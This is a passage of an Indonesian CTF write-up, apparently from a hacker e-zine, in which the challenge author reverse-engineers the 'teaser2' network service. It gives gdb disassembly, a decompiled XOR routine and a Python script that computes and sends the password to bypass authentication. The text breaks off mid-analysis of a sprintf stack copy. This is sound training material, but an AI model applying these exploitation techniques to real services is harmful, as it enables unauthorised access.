@@ -1,0 +1,1308 @@
+                      ____       (_)           _____ (_) _       ____ 
+                     (____)  ___ (_)__    ___ (_____) _ (_)__   (____)
+                    (_)_(_)_(___)(____)  (___)  _(_) (_)(____) (_)_(_)
+                    (__)__(_)___ (_) (_)(_)_(_)(_)__ (_)(_) (_)(__)__ 
+                     (____)(____)(_) (_) (___)(_____)(_)(_) (_) (____)  
+                  ECHO MAGAZINE VOLUME XII, ISSUE XXIX, PHILE 0x003.TXT                                       
+
+Exploiting echo2014 ctf teaser2 - d.m0nk3y
+d.m0nk3y/at/echo/dot/or/dot/id
+
+-----| Pendahuluan
+             
+Beberapa hari yang lalu dibuka lomba ctf teaser sebagai pemanasan sebelum ctf
+echo dimulai, dimana sebelumnya telah direncanakan sejak lama. Pada tulisan ini
+saya akan membahas tentang exploitasi pada challenge teaser2 yang diberikan
+kemarin. 
+
+Sebenarnya agak konyol karena saya harus menulis writeup pada binary yang saya
+buat sendiri, karena tidak ada yang menyelesaikan challenge ini ;).  Dan
+sebelumnya saya meminta maaf karena terjadi kesalahan pada program yang telah
+saya buat, hal ini menyebabkan challenge menjadi lebih memakan waktu ketika
+dieksploitasi secara remote. 
+
+Jika anda menganalisa dengan seksama di binary yang diberikan, anda pasti tahu
+informasi apa yang kurang dari hint yang ada didalam binary tersebut :) Tapi
+bukan berarti challenge yang diberikan tidak bisa diexploitasi, bukan? ;).
+
+-----| Binary Analysis
+
+Untuk melakukan binary analisis, ada dua langkah yang dapat ditempuh yaitu
+dengan melakukan static analisis atau melakukan dynamic analisis. Beberapa
+tools yang dibutuhkan untuk melakukan kegiatan ini antara lain debugger,
+disassembler, serta decompiler.
+
+Analisa pertama, melakukan identifikasi tipe file challenge teaser2.
+
++-----------------------------
+| haxx@debianlabs:~$ file teaser2
+| teaser2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
+| haxx@debianlabs:~$
++-----------------------------
+
+-----| Static Analysis
+
+Static analisis adalah langkah menganalisa suatu program tanpa melakukan
+eksekusi terhadap program tersebut. Biasanya yang sering dilakukan setelah
+mengetahui tipe file adalah mencari strings yang ada didalam program tersebut.
+
++-----------------------------
+| haxx@debianlabs:~$ strings teaser2
+| /lib/ld-linux.so.2
+| __gmon_start__
+| libc.so.6
+| _IO_stdin_used
+| socket
+| exit
+| htonl
+| htons
+| sprintf
+| signal
+| fork
+| __stack_chk_fail
+| listen
+| send
+| bind
+| read
+| recv
+| malloc
+| waitpid
+| close
+| accept
+| strcmp
+| __libc_start_main
+| write
+| GLIBC_2.4
+| GLIBC_2.0
+| PTRh
+| QVhD
+| D$,e
+| hckn
+| aked
+| D$48
+| D$8f
+| UWVS
+| [^_]
+| selamat datang derpsi!
+| selamat datang winki!
+| child terminated %d
+| rahasia.
+| tekan enter untuk masuk ke halaman priv8!
+| access denied!
+| ;*2$" 
+| haxx@debianlabs:~$ 
++-----------------------
+
+Selanjunya dapat dilakukan analisa terhadap fungsi-fungsi apa saja yang
+digunakan didalam program dengan bantuan disassembler.
+
++-----------------------
+| haxx@debianlabs:~$ gdb -q teaser2
+| Reading symbols from /home/haxx/teaser2...(no debugging symbols found)...done.
+| gdb-peda$ info functions 
+| All defined functions:
+| 
+| Non-debugging symbols:
+| 0x08048534  _init
+| 0x08048580  strcmp
+| 0x08048580  strcmp@plt
+| 0x08048590  read
+| 0x08048590  read@plt
+| 0x080485a0  printf
+| 0x080485a0  printf@plt
+| 0x080485b0  signal
+| 0x080485b0  signal@plt
+| 0x080485c0  __stack_chk_fail
+| 0x080485c0  __stack_chk_fail@plt
+| 0x080485d0  htons
+| 0x080485d0  htons@plt
+| 0x080485e0  accept
+| 0x080485e0  accept@plt
+| 0x080485f0  waitpid
+| 0x080485f0  waitpid@plt
+| 0x08048600  malloc
+| 0x08048600  malloc@plt
+| 0x08048610  __gmon_start__
+| 0x08048610  __gmon_start__@plt
+| 0x08048620  exit
+| 0x08048620  exit@plt
+| 0x08048630  __libc_start_main
+| 0x08048630  __libc_start_main@plt
+| 0x08048640  write
+| 0x08048640  write@plt
+| 0x08048650  bind
+| 0x08048650  bind@plt
+| 0x08048660  fork
+| 0x08048660  fork@plt
+| 0x08048670  htonl
+| 0x08048670  htonl@plt
+| 0x08048680  listen
+| 0x08048680  listen@plt
+| 0x08048690  sprintf
+| 0x08048690  sprintf@plt
+| 0x080486a0  socket
+| 0x080486a0  socket@plt
+| 0x080486b0  recv
+| 0x080486b0  recv@plt
+| 0x080486c0  close
+| 0x080486c0  close@plt
+| 0x080486d0  send
+| 0x080486d0  send@plt
+| 0x080486e0  _start
+| 0x08048710  __do_global_dtors_aux
+| 0x08048770  frame_dummy
+| 0x08048794  xora
+| 0x080487ea  xorb
+| 0x0804884b  pinkyderp
+| 0x08048961  pinkywinki
+| 0x08048a02  sig_chld
+| 0x08048a44  main
+| 0x08048d20  __libc_csu_init
+| 0x08048d90  __libc_csu_fini
+| 0x08048d92  __i686.get_pc_thunk.bx
+| 0x08048da0  __do_global_ctors_aux
+| 0x08048dcc  _fini
+| gdb-peda$ 
++------------------------
+
+Untuk melakukan analisa static analysis pada hasil disassemble program dapat
+dilakukan dengan menganalisa titik-titik instruksi kondisi (jump), pemanggilan
+fungsi lain (call), serta variable yang ada pada fungsi tersebut (size /
+value). 
+
++-----------------------
+| gdb-peda$ disas main
+| Dump of assembler code for function main:
+|    0x08048a44 <+0>: push   ebp
+|    0x08048a45 <+1>: mov    ebp,esp
+|    0x08048a47 <+3>: push   edi
+|    0x08048a48 <+4>: push   ebx
+|    0x08048a49 <+5>: and    esp,0xfffffff0
+|    0x08048a4c <+8>: sub    esp,0x480                                    // alokasi space 1152,[esp+50] .. [esp+450] = 0x400 = 1024bytes
+|    0x08048a52 <+14>:    mov    eax,DWORD PTR [ebp+0xc]                  
+|    0x08048a55 <+17>:    mov    DWORD PTR [esp+0x2c],eax                 
+|    0x08048a59 <+21>:    mov    eax,gs:0x14                              
+|    0x08048a5f <+27>:    mov    DWORD PTR [esp+0x47c],eax                                
+|    0x08048a66 <+34>:    xor    eax,eax
+|    0x08048a68 <+36>:    mov    DWORD PTR [esp+0x473],0x6e6b6368         //  hckn
+|    0x08048a73 <+47>:    mov    DWORD PTR [esp+0x477],0x64656b61         //  aked     # hcknaked
+|    0x08048a7e <+58>:    mov    BYTE PTR [esp+0x47b],0x0
+|    0x08048a86 <+66>:    mov    DWORD PTR [esp+0x34],0x8048e38           // x/s  0x8048e38:   "rahasia."
+|    0x08048a8e <+74>:    mov    DWORD PTR [esp+0x8],0x6
+|    0x08048a96 <+82>:    mov    DWORD PTR [esp+0x4],0x1
+|    0x08048a9e <+90>:    mov    DWORD PTR [esp],0x2
+|    0x08048aa5 <+97>:    call   0x80486a0 <socket@plt>
+|    0x08048aaa <+102>:   mov    DWORD PTR [esp+0x38],eax
+|    0x08048aae <+106>:   mov    WORD PTR [esp+0x450],0x2
+|    0x08048ab8 <+116>:   mov    DWORD PTR [esp],0x0
+|    0x08048abf <+123>:   call   0x8048670 <htonl@plt>
+|    0x08048ac4 <+128>:   mov    DWORD PTR [esp+0x454],eax
+|    0x08048acb <+135>:   mov    DWORD PTR [esp],0x7a69                   // 0x7a69 = 31337
+|    0x08048ad2 <+142>:   call   0x80485d0 <htons@plt>
+|    0x08048ad7 <+147>:   mov    WORD PTR [esp+0x452],ax
+|    0x08048adf <+155>:   mov    DWORD PTR [esp+0x8],0x10
+|    0x08048ae7 <+163>:   lea    eax,[esp+0x450]
+|    0x08048aee <+170>:   mov    DWORD PTR [esp+0x4],eax
+|    0x08048af2 <+174>:   mov    eax,DWORD PTR [esp+0x38]
+|    0x08048af6 <+178>:   mov    DWORD PTR [esp],eax
+|    0x08048af9 <+181>:   call   0x8048650 <bind@plt>                     // port binding
+|    0x08048afe <+186>:   mov    DWORD PTR [esp+0x4],0x5
+|    0x08048b06 <+194>:   mov    eax,DWORD PTR [esp+0x38]
+|    0x08048b0a <+198>:   mov    DWORD PTR [esp],eax
+|    0x08048b0d <+201>:   call   0x8048680 <listen@plt>                   // listen port
+|    0x08048b12 <+206>:   mov    DWORD PTR [esp+0x30],0x10
+|    0x08048b1a <+214>:   mov    DWORD PTR [esp+0x4],0x8048a02            
+|    0x08048b22 <+222>:   mov    DWORD PTR [esp],0x11
+|    0x08048b29 <+229>:   call   0x80485b0 <signal@plt>
+|    0x08048b2e <+234>:   lea    eax,[esp+0x30]
+|    0x08048b32 <+238>:   mov    DWORD PTR [esp+0x8],eax
+|    0x08048b36 <+242>:   lea    eax,[esp+0x460]
+|    0x08048b3d <+249>:   mov    DWORD PTR [esp+0x4],eax
+|    0x08048b41 <+253>:   mov    eax,DWORD PTR [esp+0x38]
+|    0x08048b45 <+257>:   mov    DWORD PTR [esp],eax
+|    0x08048b48 <+260>:   call   0x80485e0 <accept@plt>                   // menerima komunikasi socket
+|    0x08048b4d <+265>:   mov    DWORD PTR [esp+0x3c],eax
+|    0x08048b51 <+269>:   call   0x8048660 <fork@plt>                     // fork()
+|    0x08048b56 <+274>:   mov    DWORD PTR [esp+0x40],eax
+|    0x08048b5a <+278>:   cmp    DWORD PTR [esp+0x40],0x0
+|    0x08048b5f <+283>:   jne    0x8048d03 <main+703>
+|    0x08048b65 <+289>:   jmp    0x8048b68 <main+292>
+|    0x08048b67 <+291>:   nop
+|    0x08048b68 <+292>:   lea    eax,[esp+0x50]
+|    0x08048b6c <+296>:   mov    ebx,eax
+|    0x08048b6e <+298>:   mov    eax,0x0
+|    0x08048b73 <+303>:   mov    edx,0x100
+|    0x08048b78 <+308>:   mov    edi,ebx
+|    0x08048b7a <+310>:   mov    ecx,edx
+|    0x08048b7c <+312>:   rep stos DWORD PTR es:[edi],eax
+|    0x08048b7e <+314>:   mov    DWORD PTR [esp+0xc],0x0
+|    0x08048b86 <+322>:   mov    DWORD PTR [esp+0x8],0x40                 // alokasi size recv 0x40 = 64 bytes
+|    0x08048b8e <+330>:   lea    eax,[esp+0x50]
+|    0x08048b92 <+334>:   mov    DWORD PTR [esp+0x4],eax
+|    0x08048b96 <+338>:   mov    eax,DWORD PTR [esp+0x3c]
+|    0x08048b9a <+342>:   mov    DWORD PTR [esp],eax
+|    0x08048b9d <+345>:   call   0x80486b0 <recv@plt>                     // recv(), menerima input socket 
+|    0x08048ba2 <+350>:   mov    DWORD PTR [esp+0x44],eax
+|    0x08048ba6 <+354>:   lea    eax,[esp+0x50]                           // hasil input recv(), max size 1024
+|    0x08048baa <+358>:   mov    DWORD PTR [esp+0x28],0xffffffff
+|    0x08048bb2 <+366>:   mov    edx,eax
+|    0x08048bb4 <+368>:   mov    eax,0x0
+|    0x08048bb9 <+373>:   mov    ecx,DWORD PTR [esp+0x28]
+|    0x08048bbd <+377>:   mov    edi,edx
+|    0x08048bbf <+379>:   repnz scas al,BYTE PTR es:[edi]
+|    0x08048bc1 <+381>:   mov    eax,ecx
+|    0x08048bc3 <+383>:   not    eax
+|    0x08048bc5 <+385>:   sub    eax,0x1
+|    0x08048bc8 <+388>:   add    eax,0x1
+|    0x08048bcb <+391>:   mov    DWORD PTR [esp],eax
+|    0x08048bce <+394>:   call   0x8048600 <malloc@plt>                   // mengalokasikan memory
+|    0x08048bd3 <+399>:   mov    DWORD PTR [esp+0x48],eax
+|    0x08048bd7 <+403>:   lea    eax,[esp+0x473]                           
+|    0x08048bde <+410>:   mov    DWORD PTR [esp+0x28],0xffffffff
+|    0x08048be6 <+418>:   mov    edx,eax
+|    0x08048be8 <+420>:   mov    eax,0x0
+|    0x08048bed <+425>:   mov    ecx,DWORD PTR [esp+0x28]
+|    0x08048bf1 <+429>:   mov    edi,edx
+|    0x08048bf3 <+431>:   repnz scas al,BYTE PTR es:[edi]
+|    0x08048bf5 <+433>:   mov    eax,ecx
+|    0x08048bf7 <+435>:   not    eax
+|    0x08048bf9 <+437>:   sub    eax,0x1
+|    0x08048bfc <+440>:   mov    ebx,eax
+|    0x08048bfe <+442>:   lea    eax,[esp+0x50]
+|    0x08048c02 <+446>:   mov    DWORD PTR [esp+0x28],0xffffffff
+|    0x08048c0a <+454>:   mov    edx,eax
+|    0x08048c0c <+456>:   mov    eax,0x0
+|    0x08048c11 <+461>:   mov    ecx,DWORD PTR [esp+0x28]
+|    0x08048c15 <+465>:   mov    edi,edx
+|    0x08048c17 <+467>:   repnz scas al,BYTE PTR es:[edi]
+|    0x08048c19 <+469>:   mov    eax,ecx
+|    0x08048c1b <+471>:   not    eax
+|    0x08048c1d <+473>:   sub    eax,0x1
+|    0x08048c20 <+476>:   mov    edx,DWORD PTR [esp+0x48]
+|    0x08048c24 <+480>:   mov    DWORD PTR [esp+0x10],edx
+|    0x08048c28 <+484>:   mov    DWORD PTR [esp+0xc],ebx
+|    0x08048c2c <+488>:   lea    edx,[esp+0x473]                      // argument dengan nilai 'hcknaked', alamat [esp+473]
+|    0x08048c33 <+495>:   mov    DWORD PTR [esp+0x8],edx
+|    0x08048c37 <+499>:   mov    DWORD PTR [esp+0x4],eax              
+|    0x08048c3b <+503>:   lea    eax,[esp+0x50]                       // argument dengan nilai input recv()
+|    0x08048c3f <+507>:   mov    DWORD PTR [esp],eax
+|    0x08048c42 <+510>:   call   0x8048794 <xora>                     // memanggil fungsi xora
+|    0x08048c47 <+515>:   mov    DWORD PTR [esp+0x4c],eax
+|    0x08048c4b <+519>:   mov    eax,DWORD PTR [esp+0x34]
+|    0x08048c4f <+523>:   mov    DWORD PTR [esp+0x4],eax
+|    0x08048c53 <+527>:   mov    eax,DWORD PTR [esp+0x4c]
+|    0x08048c57 <+531>:   mov    DWORD PTR [esp],eax
+|    0x08048c5a <+534>:   call   0x8048580 <strcmp@plt>               // kondisi melakukan perbandingan string
+|    0x08048c5f <+539>:   test   eax,eax
+| -- 0x08048c61 <+541>:   jne    0x8048cce <main+650>                 // jika string tidak sama maka jump ke 0x8048cce
+||   0x08048c63 <+543>:  mov    DWORD PTR [esp+0x8],0x2a
+||   0x08048c6b <+551>:  mov    DWORD PTR [esp+0x4],0x8048e44        // x/s  0x8048e44:   "tekan enter untuk masuk ke halaman priv8!\n"
+||   0x08048c73 <+559>:  mov    eax,DWORD PTR [esp+0x3c]
+||   0x08048c77 <+563>:  mov    DWORD PTR [esp],eax
+||   0x08048c7a <+566>:  call   0x8048640 <write@plt>                // mengirimkan pesan melalui socket
+||   0x08048c7f <+571>:  mov    DWORD PTR [esp+0xc],0x0
+||   0x08048c87 <+579>:  mov    DWORD PTR [esp+0x8],0x6c             // alokasi size 0x6c = 108 bytes
+||   0x08048c8f <+587>:  lea    eax,[esp+0x50]
+||   0x08048c93 <+591>:  mov    DWORD PTR [esp+0x4],eax
+||   0x08048c97 <+595>:  mov    eax,DWORD PTR [esp+0x3c]
+||   0x08048c9b <+599>:  mov    DWORD PTR [esp],eax
+||   0x08048c9e <+602>:  call   0x80486b0 <recv@plt>                 // recv(), menerima input socket
+||   0x08048ca3 <+607>:  mov    DWORD PTR [esp+0x44],eax
+||   0x08048ca7 <+611>:  mov    eax,DWORD PTR [esp+0x44]
+||   0x08048cab <+615>:  mov    DWORD PTR [esp+0x8],eax              
+||   0x08048caf <+619>:  mov    eax,DWORD PTR [esp+0x3c]             
+||   0x08048cb3 <+623>:  mov    DWORD PTR [esp+0x4],eax
+||   0x08048cb7 <+627>:  lea    eax,[esp+0x50]                       // argument dengan nilai input recv()
+||   0x08048cbb <+631>:  mov    DWORD PTR [esp],eax
+||   0x08048cbe <+634>:  call   0x804884b <pinkyderp>                // memanggil fungsi pinkyderp
+||   0x08048cc3 <+639>:  cmp    eax,0x1
+||   0x08048cc6 <+642>:  je     0x8048b67 <main+291>
+||   0x08048ccc <+648>:  jmp    0x8048ceb <main+679>
+|->  0x08048cce <+650>:  mov    DWORD PTR [esp+0x8],0xf
+|    0x08048cd6 <+658>:   mov    DWORD PTR [esp+0x4],0x8048e6f        // x/s 0x8048e6f: "access denied!\n"
+|    0x08048cde <+666>:   mov    eax,DWORD PTR [esp+0x3c]
+|    0x08048ce2 <+670>:   mov    DWORD PTR [esp],eax
+|    0x08048ce5 <+673>:   call   0x8048640 <write@plt>                // mengirimkan pesan melalui socket
+|    0x08048cea <+678>:   nop
+|    0x08048ceb <+679>:   mov    eax,DWORD PTR [esp+0x3c]
+|    0x08048cef <+683>:   mov    DWORD PTR [esp],eax
+|    0x08048cf2 <+686>:   call   0x80486c0 <close@plt>                // close(), mengakhiri komunikasi socket
+|    0x08048cf7 <+691>:   mov    DWORD PTR [esp],0x0
+|    0x08048cfe <+698>:   call   0x8048620 <exit@plt>                 // exit(), mengakhiri proses
+|    0x08048d03 <+703>:   mov    eax,DWORD PTR [esp+0x3c]
+|    0x08048d07 <+707>:   mov    DWORD PTR [esp],eax
+|    0x08048d0a <+710>:   call   0x80486c0 <close@plt>                // close(), mengakhiri komunikasi socket
+|    0x08048d0f <+715>:   jmp    0x8048b2e <main+234>
+| End of assembler dump.
+| gdb-peda$
++------------------------------
+
+Jika dianalisa secara umum, baris fungsi main digunakan sebagai handler untuk
+tcpserver. Pada awal baris fungsi main, menempatkan variable dengan tipe
+character dengan isi nilai string 'hcknaked', dan 'rahasia.'. Kemudian program
+menyediakan servis tcpserver yang berjalan pada port 31337. Program melakukan
+fork terhadap setiap request yang diterima pada tcpserver, sehingga program
+(parent) tidak crash ketika terjadi kesalahan yang menyebabkan crash setelah
+dilakukan fork namun child process-nya yang akan crash. 
+
++-----------------------------
+| gdb-peda$ disas xora
+| Dump of assembler code for function xora:
+|   0x08048794 <+0>: push   ebp
+|    0x08048795 <+1>: mov    ebp,esp
+|    0x08048797 <+3>: push   ebx
+|    0x08048798 <+4>: sub    esp,0x10
+|    0x0804879b <+7>: mov    DWORD PTR [ebp-0x8],0x0
+|    0x080487a2 <+14>:    jmp    0x80487d0 <xora+60>
+|    0x080487a4 <+16>:    mov    eax,DWORD PTR [ebp-0x8]
+|    0x080487a7 <+19>:    mov    ecx,eax
+|    0x080487a9 <+21>:    add    ecx,DWORD PTR [ebp+0x18]
+|    0x080487ac <+24>:    mov    eax,DWORD PTR [ebp-0x8]
+|    0x080487af <+27>:    add    eax,DWORD PTR [ebp+0x8]
+|    0x080487b2 <+30>:    movzx  ebx,BYTE PTR [eax]
+|    0x080487b5 <+33>:    mov    eax,DWORD PTR [ebp-0x8]
+|    0x080487b8 <+36>:    mov    edx,eax
+|    0x080487ba <+38>:    sar    edx,0x1f
+|    0x080487bd <+41>:    idiv   DWORD PTR [ebp+0x14]
+|    0x080487c0 <+44>:    mov    eax,edx
+|    0x080487c2 <+46>:    add    eax,DWORD PTR [ebp+0x10]
+|    0x080487c5 <+49>:    movzx  eax,BYTE PTR [eax]
+|    0x080487c8 <+52>:    xor    eax,ebx
+|    0x080487ca <+54>:    mov    BYTE PTR [ecx],al
+|    0x080487cc <+56>:    add    DWORD PTR [ebp-0x8],0x1
+|    0x080487d0 <+60>:    mov    eax,DWORD PTR [ebp-0x8]
+|    0x080487d3 <+63>:    cmp    eax,DWORD PTR [ebp+0xc]
+|    0x080487d6 <+66>:    jl     0x80487a4 <xora+16>
+|    0x080487d8 <+68>:    mov    eax,DWORD PTR [ebp+0xc]
+|    0x080487db <+71>:    add    eax,DWORD PTR [ebp+0x18]
+|    0x080487de <+74>:    mov    BYTE PTR [eax],0x0
+|    0x080487e1 <+77>:    mov    eax,DWORD PTR [ebp+0x18]
+|    0x080487e4 <+80>:    add    esp,0x10
+|    0x080487e7 <+83>:    pop    ebx
+|    0x080487e8 <+84>:    pop    ebp
+|    0x080487e9 <+85>:    ret    
+| End of assembler dump.
+| gdb-peda$
++-----------------------------------
+
+Jika static analisis dengan menggunakan disassembler masih terasa susah untuk
+dipahami secara cepat, kita dapat mempergunakan decompiler seperti ida pro [1]
+ataupun hopper [2] untuk mempermudah analisa. Berikut hasil decompile
+mempergunakan hopper.
+
++----------------------------------
+| ifunction xora {
+|     var_12 = 0x0;
+|     while (var_12 < arg_offset_x4) {
+|            temp_0 = var_12 / arg_offset_xC;
+|            temp_1 = var_12 % arg_offset_xC;
+|            *(int8_t *)(var_12 + arg_offset_x10) = LOBYTE(*(int8_t *)(temp_1 + arg_offset_x8) & 0xff ^ *(int8_t *)(var_12 + arg_offset_x0) & 0xff);
+|            var_12 = var_12 + 0x1;
+|    }
+|    *(int8_t *)(arg_offset_x4 + arg_offset_x10) = 0x0;
+|    eax = arg_offset_x10;
+|    return eax;
+| }
++-----------------------------------
+
+-----| Dynamic Analisis
+
+Untuk melakukan dynamic analisis dapat dilakukan dengan mempergunakan tools
+seperti strace [3] ataupun mempergunakan debugger. Untuk melakukan analisa
+authentifikasi xora, dapat dilakukan break pada debugger ketika melakukan
+instruksi perbandingan. Berikut potongan kode hasil disassemble fungsi main.
+
++------ snip ---
+|   0x08048c57 <+531>:   mov    DWORD PTR [esp],eax
+|   0x08048c5a <+534>:   call   0x8048580 <strcmp@plt>
+|   0x08048c5f <+539>:   test   eax,eax
+|   0x08048c61 <+541>:   jne    0x8048cce <main+650>
+|   0x08048c63 <+543>:   mov    DWORD PTR [esp+0x8],0x2a
++------ snip ---
+
++------------------------------------
+| gdb-peda$ break *0x08048c5f
+| Breakpoint 1 at 0x8048c5f
+| gdb-peda$ set follow-fork-mode child 
+| gdb-peda$ run
++------------------------------------
+
+Oh ya, program ini melakukan fork pada setiap koneksi yang diterima, sehingga
+untuk melakukan debugging pada child process-nya harus dilakukan attach pid
+atau dapat diset 'follow-fork-mode child'.
+
+lalu pada terminal lainnya jalankan nc dengan melakukan binding port pada
+service program teaser2
+
++----------------------------------
+| haxx@debianlabs:/tmp$ nc localhost 31337
+| AAAAAAAA
++----------------------------------
+
+maka program akan berhenti pada breakpoint yang telah dipasang sebelumnya.
+
++---------------------------------
+| gdb-peda$ run
+| [New process 17511]
+| [Switching to process 17511]
+| [----------------------------------registers-----------------------------------]
+| EAX: 0xffffffff 
+| EBX: 0x8 
+| ECX: 0x72 ('r')
+| EDX: 0x804c008 (")\"*/ *$%b")
+| ESI: 0x0 
+| EDI: 0xbffff3aa --> 0x0 
+| EBP: 0xbffff7d8 --> 0xbffff858 --> 0x0 
+| ESP: 0xbffff350 --> 0x804c008 (")\"*/ *$%b")
+| EIP: 0x8048c5f (<main+539>: test   eax,eax)
+| EFLAGS: 0x200297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+| [-------------------------------------code-------------------------------------]
+|    0x8048c53 <main+527>:    mov    eax,DWORD PTR [esp+0x4c]
+|    0x8048c57 <main+531>:    mov    DWORD PTR [esp],eax
+|    0x8048c5a <main+534>:    call   0x8048580 <strcmp@plt>
+| => 0x8048c5f <main+539>:    test   eax,eax
+|    0x8048c61 <main+541>:    jne    0x8048cce <main+650>
+|    0x8048c63 <main+543>:    mov    DWORD PTR [esp+0x8],0x2a
+|    0x8048c6b <main+551>:    mov    DWORD PTR [esp+0x4],0x8048e44
+|    0x8048c73 <main+559>:    mov    eax,DWORD PTR [esp+0x3c]
+| [------------------------------------stack-------------------------------------]
+| 0000| 0xbffff350 --> 0x804c008 (")\"*/ *$%b")
+| 0004| 0xbffff354 --> 0x8048e38 ("rahasia.")
+| 0008| 0xbffff358 --> 0xbffff7c3 ("hcknaked")
+| 0012| 0xbffff35c --> 0x8 
+| 0016| 0xbffff360 --> 0x804c008 (")\"*/ *$%b")
+| 0020| 0xbffff364 --> 0x13 
+| 0024| 0xbffff368 --> 0x13 
+| 0028| 0xbffff36c --> 0x4 
+| [------------------------------------------------------------------------------]
+| Legend: code, data, rodata, value
+|
+| Breakpoint 1, 0x08048c5f in main ()
+| gdb-peda$
++-------------------------------
+
+
+dari hasil input yang dikirimkan mempergunakan nc, nilai 'AAAAAAA' yang
+dikirimkan berubah menjadi ')\"*/ *$%b' setelah memanggil fungsi xora, yang
+kemudian dibandingkan dengan nilai "rahasia." yang artinya ketika hasil input
+setelah dilakukan pengolahan pada fungsi xora tidak bernilai "rahasia." maka
+instruksi akan melakukan jump ke alamat 0x8048cce dan teaser2 akan mengirimkan
+output "access denied!" yang diikuti dengan connection close.
+
+Seperti penggunaan nama fungsi 'xora', fungsi ini melakukan xor terhadap nilai
+input yang dikirimkan oleh client, kemudian dilakukan xor dengan string
+'hcknaked', jika hasil xor sama dengan 'rahasia.' maka program akan melanjutkan
+ke instruksi berikutnya tanpa melakukan jump.
+
+jika dituliskan pada kode c, fungsi xora adalah sebagai berikut:
+
++---------------------------------
+| char *xora(const char plain_text[8], int text_len, const char key[8], int key_len, char *enc) {
+|    int i;
+|    for(i=0;i<text_len;i++) {
+|        enc[i] = plain_text[i] ^ key[i % key_len];
+|    }
+|    enc[text_len] = '\0';
+|    return enc; 
+| }
++--------------------------------
+
+Berikut ini adalah kode python yang digunakan untuk melakukan kalkulasi nilai
+input agar hasil xora adalah 'rahasia.'
+
++--------------------------------
+| #!/usr/bin/python
+| from socket import *
+| 
+| def xor(key, plain):
+|     enc = []
+|     for x,y in enumerate(plain):
+|         enc.append(chr(ord(y) ^ ord(key[x % len(key)])))
+|     return "".join(enc)
+| 
+| def conn(auth):
+|     s = socket(AF_INET, SOCK_STREAM)
+|     s.connect(('localhost', 31337))
+|     s.send(auth)
+|     print s.recv(1024)
+|
+| def main():
+|    auth = xor('hcknaked', 'rahasia.')
+|    conn(auth)
+|
+| if __name__ == "__main__":
+|     main()
++-------------------------------
+
+Setelah program sukses melewati proses authentifikasi, program akan meminta
+user untuk melakukan enter, kemudian program mengeksekusi fungsi pinkyderp.
+
++------------------------------
+| gdb-peda$ disas pinkyderp 
+| Dump of assembler code for function pinkyderp:
+|    0x0804884b <+0>: push   ebp
+|    0x0804884c <+1>: mov    ebp,esp
+|    0x0804884e <+3>: push   edi
+|    0x0804884f <+4>: sub    esp,0xd4                                 // alokasi memory 0xd4 = 212 
+|    0x08048855 <+10>:    mov    eax,DWORD PTR [ebp+0x8]
+|    0x08048858 <+13>:    mov    DWORD PTR [ebp-0xbc],eax 
+|    0x0804885e <+19>:    mov    eax,gs:0x14                          // copy random cookies dari register gs
+|    0x08048864 <+25>:    mov    DWORD PTR [ebp-0xc],eax              // menyimpan cookies di ebp-0xc
+|    0x08048867 <+28>:    xor    eax,eax
+|    0x08048869 <+30>:    mov    DWORD PTR [esp+0x8],0x17             // alokasi size pesan
+|    0x08048871 <+38>:    mov    DWORD PTR [esp+0x4],0x8048df0        // x/s 0x8048df0:    "selamat datang derpsi!\n"
+|    0x08048879 <+46>:    mov    eax,DWORD PTR [ebp+0xc]
+|    0x0804887c <+49>:    mov    DWORD PTR [esp],eax
+|    0x0804887f <+52>:    call   0x8048640 <write@plt>                // mengirimkan pesan ke client
+|    0x08048884 <+57>:    mov    DWORD PTR [esp+0x8],0x28             // alokasi size recv 0x28 = 40bytes
+|    0x0804888c <+65>:    lea    eax,[ebp-0x3c]                       // ptr dest variable size 48, [ebp-3c] .. [ebp-6c]
+|    0x0804888f <+68>:    mov    DWORD PTR [esp+0x4],eax
+|    0x08048893 <+72>:    mov    eax,DWORD PTR [ebp+0xc]
+|    0x08048896 <+75>:    mov    DWORD PTR [esp],eax
+|    0x08048899 <+78>:    call   0x8048590 <read@plt>                 // menerima input dari client
+|    0x0804889e <+83>:    mov    eax,0x8048e08                        // %s
+|    0x080488a3 <+88>:    lea    edx,[ebp-0x3c]                       // size 48
+|    0x080488a6 <+91>:    mov    DWORD PTR [esp+0x8],edx
+|    0x080488aa <+95>:    mov    DWORD PTR [esp+0x4],eax
+|    0x080488ae <+99>:    lea    eax,[ebp-0x6c]                       // ptr ke var size 64, [ebp-0x6c] .. [ebp-0xac]
+|    0x080488b1 <+102>:   mov    DWORD PTR [esp],eax
+|    0x080488b4 <+105>:   call   0x8048690 <sprintf@plt>              // melakukan copy
+|    0x080488b9 <+110>:   mov    DWORD PTR [ebp-0xb0],eax             
+|    0x080488bf <+116>:   mov    eax,DWORD PTR [ebp-0xbc]
+|    0x080488c5 <+122>:   mov    DWORD PTR [ebp-0xc0],0xffffffff
+|    0x080488cf <+132>:   mov    edx,eax
+|    0x080488d1 <+134>:   mov    eax,0x0
+|    0x080488d6 <+139>:   mov    ecx,DWORD PTR [ebp-0xc0]
+|    0x080488dc <+145>:   mov    edi,edx
+|    0x080488de <+147>:   repnz scas al,BYTE PTR es:[edi]
+|    0x080488e0 <+149>:   mov    eax,ecx
+|    0x080488e2 <+151>:   not    eax
+|    0x080488e4 <+153>:   sub    eax,0x1
+|    0x080488e7 <+156>:   mov    DWORD PTR [esp+0x8],eax
+|    0x080488eb <+160>:   lea    eax,[ebp-0x6c]                       // ptr ke variable size 64
+|    0x080488ee <+163>:   mov    DWORD PTR [esp+0x4],eax
+|    0x080488f2 <+167>:   mov    eax,DWORD PTR [ebp+0xc]
+|    0x080488f5 <+170>:   mov    DWORD PTR [esp],eax
+|    0x080488f8 <+173>:   call   0x8048640 <write@plt>                // mengirimkan pesan ke client
+|    0x080488fd <+178>:   mov    DWORD PTR [esp+0xc],0x0
+|    0x08048905 <+186>:   mov    DWORD PTR [esp+0x8],0xc8             // size 0xc8 = 200bytes
+|    0x0804890d <+194>:   lea    eax,[ebp-0xac]                       // ptr 
+|    0x08048913 <+200>:   mov    DWORD PTR [esp+0x4],eax 
+|    0x08048917 <+204>:   mov    eax,DWORD PTR [ebp+0xc]
+|    0x0804891a <+207>:   mov    DWORD PTR [esp],eax
+|    0x0804891d <+210>:   call   0x80486b0 <recv@plt>                 // menerima input dari client
+|    0x08048922 <+215>:   mov    DWORD PTR [esp+0xc],0x0
+|    0x0804892a <+223>:   mov    DWORD PTR [esp+0x8],0xc8             // size 0xc8 = 200
+|    0x08048932 <+231>:   lea    eax,[ebp-0xac]
